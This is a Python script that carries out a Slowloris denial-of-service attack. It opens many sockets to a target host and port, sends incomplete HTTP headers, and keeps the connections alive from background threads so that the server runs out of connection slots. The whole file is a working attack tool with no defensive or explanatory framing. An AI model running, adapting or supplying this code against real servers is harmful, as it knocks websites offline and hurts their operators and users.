import socket
import threading
import time
from colorama import Fore

sockets = []

def init_socket(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except Exception:
        return None

def slowloris_attack(target, port):
    try:
        while True:
            for s in list(sockets):
                try:
                    s.send("X-a: {}\r\n".format(time.time()).encode("utf-8"))
                except Exception:
                    sockets.remove(s)
            time.sleep(10)
    except KeyboardInterrupt:
        pass

def start_attack(target, port, threads, proxies):
    print(Fore.GREEN + f"[+] Slowloris Attack Started on {target}:{port} with {threads} sockets")
    time.sleep(1)

    for _ in range(threads):
        s = init_socket(target, port)
        if s:
            sockets.append(s)

    for _ in range(3):  # spawn 3 background keep-alive threads
        th = threading.Thread(target=slowloris_attack, args=(target, port))
        th.daemon = True
        th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped by user")
